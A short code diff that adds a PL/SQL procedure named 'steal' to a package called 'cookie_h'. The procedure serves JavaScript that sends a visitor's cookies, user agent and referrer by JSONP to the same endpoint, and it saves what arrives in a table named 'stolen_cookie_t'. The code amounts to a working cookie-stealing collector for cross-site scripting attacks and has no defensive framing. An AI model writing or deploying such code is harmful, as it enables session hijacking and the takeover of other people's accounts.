@@ -97,5 +97,31 @@ create or replace package body cookie_h is
 	
 	end;
 
+	procedure steal is
+		v stolen_cookie_t%rowtype;
+	begin
+		if r.is_lack('cookie') then
+			-- gen script content
+			x.t(x.r('
+			$.ajax("@",{
+			  dataType: "jsonp",
+				data: {
+					cookie:document.cookie,
+					ua:navigator.userAgent,
+					referer:document.referrer
+				}	
+			});
+			',
+							r.url_full));
+		else
+			-- got stealed info
+			v.logtime := sysdate;
+			v.referer := r.getc('referer');
+			v.cookies := r.getc('cookie');
+			v.ua      := r.getc('ua');
+			insert into stolen_cookie_t values v;
+		end if;
+	end;
+
 end cookie_h;
 /
